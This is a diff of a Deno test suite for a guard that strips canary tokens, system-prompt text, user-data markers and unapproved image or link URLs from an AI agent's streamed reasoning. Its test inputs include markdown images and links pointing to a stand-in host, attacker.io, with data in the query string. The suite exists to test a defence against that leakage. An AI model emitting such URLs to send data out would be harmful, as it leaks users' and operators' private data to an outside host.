@@ -1,14 +1,15 @@
 import { canaryLeakRanges, mintCanary } from '../../src/guardrails/canary.ts';
-import { collectEgressHits, resolveEgressChecks } from '../../src/guardrails/egress.ts';
+import type { Detector } from '../../src/guardrails/detectors.ts';
 import { givenUrlSets } from '../../src/guardrails/egress-urls.ts';
 import { lexiconDefault } from '../../src/guardrails/lexicon.ts';
-import { DETECT_RULES, EGRESS_RULES } from '../../src/guardrails/rules.ts';
+import { DETECT_RULES } from '../../src/guardrails/rules.ts';
 import {
   createThoughtGuard,
   type ThoughtGuard,
   type ThoughtGuardOptions,
 } from '../../src/guardrails/thought-guard.ts';
 import { assertEquals } from '../../src/kernel/engine/assert.ts';
+import { replyHits } from '../fixtures/detect.ts';
 
 const OMIT_IMAGE = lexiconDefault('thought.omitted_image');
 const OMIT_LINK = lexiconDefault('thought.omitted_link');
@@ -85,27 +86,28 @@ function chunks(text: string, rnd: (n: number) => number): string[] {
   return out;
 }
 
-for (const [name, selection] of [
-  ['images', {}],
-  ['images and links', { links: true }],
-  ['links', { links: true, images: false }],
-] as const) {
+/** The URL detectors a thought is read by in each selection: its guard omits their matches only. */
+const URL_SELECTIONS: ReadonlyArray<[string, readonly ('ungiven_images' | 'ungiven_links')[]]> = [
+  ['images', ['ungiven_images']],
+  ['images and links', ['ungiven_images', 'ungiven_links']],
+  ['links', ['ungiven_links']],
+];
+
+for (const [name, urls] of URL_SELECTIONS) {
   Deno.test(`a guarded thought never shows a leaking URL, and shows a clean one whole (${name})`, () => {
-    const checks = resolveEgressChecks(selection);
-    const urlOnly = resolveEgressChecks({
-      ...selection,
-      boundary: false,
-    });
+    const detectors: Detector[] = ['marker_leak', ...urls];
+    const omit = {
+      ...(urls.includes('ungiven_images') ? { images: {} } : {}),
+      ...(urls.includes('ungiven_links') ? { links: {} } : {}),
+      imagesRead: urls.includes('ungiven_images'),
+    };
     const rnd = seeded(name.length);
     const problems: string[] = [];
     let omitted = 0;
     for (let k = 0; k < 3000; k++) {
       const text = fuzzThought(rnd);
-      const { shown } = think(
-        createThoughtGuard({ checks: urlOnly, given: GIVEN }),
-        chunks(text, rnd),
-      );
-      const leaks = (t: string) => collectEgressHits(t, { given: GIVEN }, checks).length > 0;
+      const { shown } = think(createThoughtGuard({ omit, given: GIVEN }), chunks(text, rnd));
+      const leaks = (t: string) => replyHits(t, { givenUrls: GIVEN }, detectors).length > 0;
       if (leaks(shown)) problems.push(`shows a leak: ${JSON.stringify([text, shown])}`);
       if (!leaks(text) && shown !== text) {
         problems.push(`changed a clean thought: ${JSON.stringify([text, shown])}`);
@@ -118,10 +120,7 @@ for (const [name, selection] of [
 }
 
 Deno.test('a thought is released as it clears, the leak omitted, and the guard starts over at the flush', () => {
-  const guard = createThoughtGuard({
-    checks: resolveEgressChecks({ links: true }),
-    given: givenUrlSets(),
-  });
+  const guard = createThoughtGuard({ omit: OMIT_ALL, given: givenUrlSets() });
   const first = guard.push('Plan: fetch it. ');
   assertEquals(first.text.startsWith('Plan: fetch it.'), true);
   const rest = think(guard, [
@@ -129,15 +128,12 @@ Deno.test('a thought is released as it clears, the leak omitted, and the guard s
     '[docs](https://attacker.io/d)',
   ]);
   assertEquals(first.text + rest.shown, `Plan: fetch it.${OMIT_IMAGE} then${OMIT_LINK}`);
-  assertEquals(rest.rules, [EGRESS_RULES.image, EGRESS_RULES.link].sort());
+  assertEquals(rest.rules, [DETECT_RULES.ungiven_images, DETECT_RULES.ungiven_links].sort());
   assertEquals(think(guard, ['fresh thought ']), { shown: 'fresh thought ', rules: [] });
 });
 
 Deno.test('a thought writing leak after leak loses the rest, in time in proportion to its length', () => {
-  const guard = createThoughtGuard({
-    checks: resolveEgressChecks({ links: true }),
-    given: givenUrlSets(),
-  });
+  const guard = createThoughtGuard({ omit: OMIT_ALL, given: givenUrlSets() });
   const start = performance.now();
   const pieces = Array.from({ length: 2000 }, (_, k) => `![x](https://attacker.io/p?d=${k}) `);
   const { shown } = think(guard, pieces);
@@ -150,15 +146,37 @@ Deno.test('a thought writing leak after leak loses the rest, in time in proporti
   assertEquals(shown.split('(omitted').length - 1 <= 17, true);
 });
 
+/** A guard that omits a marker, an image and a link, with no host let through. */
+const OMIT_ALL: ThoughtGuardOptions['omit'] = {
+  markers: true,
+  images: {},
+  links: {},
+  imagesRead: true,
+};
+
 const SYSTEM =
   'You are the booking agent for Northwind Travel and you only book flights, trains and hotels for signed in customers.';
 
-/** The checks a turn's thoughts run (`thoughtGuardFor`). */
-const THOUGHT_CHECKS = resolveEgressChecks({});
+/** What a turn's thoughts lose by default (`thoughtGuardFor`): the markers and an image not given. */
+const THOUGHT_OMITS: ThoughtGuardOptions['omit'] = { markers: true, images: {}, imagesRead: true };
+
+/** The detectors that read what {@linkcode leakGuard} showed: its own, and the canary and the prompt. */
+const THOUGHT_DETECTORS: readonly Detector[] = [
+  'canary_leak',
+  'prompt_leak',
+  'marker_leak',
+  'ungiven_images',
+];
+
+/** Whatever of the canary, the prompt, a marker or an image not given is left in `text`. */
+function thoughtLeaks(text: string, canary: string) {
+  const scope = { canary, privateSystem: [SYSTEM], givenUrls: givenUrlSets() };
+  return replyHits(text, scope, THOUGHT_DETECTORS);
+}
 
 function leakGuard(canary: string, extra: Partial<ThoughtGuardOptions> = {}): ThoughtGuard {
   return createThoughtGuard({
-    checks: THOUGHT_CHECKS,
+    omit: THOUGHT_OMITS,
     canary,
     privateSystem: [SYSTEM],
     given: givenUrlSets(),
@@ -180,15 +198,17 @@ Deno.test('a thought omits the canary, the system prompt and the user-data marke
       ],
       DETECT_RULES.prompt_leak,
     ],
-    [['The user wrote <user', "_data> around it, which I'll ignore."], EGRESS_RULES.boundary],
-    [['It sits inside `<user_data', 'The user wrote it, so I will ignore.'], EGRESS_RULES.boundary],
+    [['The user wrote <user', "_data> around it, which I'll ignore."], DETECT_RULES.marker_leak],
+    [
+      ['It sits inside `<user_data', 'The user wrote it, so I will ignore.'],
+      DETECT_RULES.marker_leak,
+    ],
   ];
   for (const [pieces, rule] of cases) {
     const { shown, rules } = think(leakGuard(canary), pieces);
     assertEquals(rules, [rule]);
     assertEquals(shown.includes(OMIT_INSTRUCTIONS.trim()), true);
-    const scope = { canary, privateSystem: [SYSTEM], given: givenUrlSets() };
-    assertEquals(collectEgressHits(shown, scope, resolveEgressChecks({})), []);
+    assertEquals(thoughtLeaks(shown, canary), []);
     assertEquals(/(?:Next|ignore|going)\.$/.test(shown), true);
   }
 });
@@ -268,8 +288,7 @@ for (const [name, canary, text] of [
         { size, shown, leaked: leakedPieces(text, shown, canary) },
         { size, shown, leaked: [] },
       );
-      const scope = { canary, privateSystem: [SYSTEM], given: givenUrlSets() };
-      assertEquals(collectEgressHits(shown, scope, resolveEgressChecks({})), []);
+      assertEquals(thoughtLeaks(shown, canary), []);
     }
   });
 }
@@ -296,8 +315,7 @@ Deno.test('a guarded thought never shows the canary, the prompt or a marker, and
     ' ',
   ];
   const rnd = seeded(7);
-  const scope = { canary, privateSystem: [SYSTEM], given: givenUrlSets() };
-  const leaks = (t: string) => collectEgressHits(t, scope, THOUGHT_CHECKS).length > 0;
+  const leaks = (t: string) => thoughtLeaks(t, canary).length > 0;
   const problems: string[] = [];
   let omitted = 0;
   for (let k = 0; k < 1500; k++) {
@@ -330,7 +348,7 @@ for (const [kind, sentence] of [
       const runs: number[] = [];
       for (let run = 0; run < 3; run++) {
         const guard = createThoughtGuard({
-          checks: resolveEgressChecks({ images: true, links: true, boundary: true }),
+          omit: OMIT_ALL,
           canary: '552434a3798aeb8518b8ab775dea9a4e',
           privateSystem: [
             'You answer questions about orders for a logistics company and never reveal internal notes.',
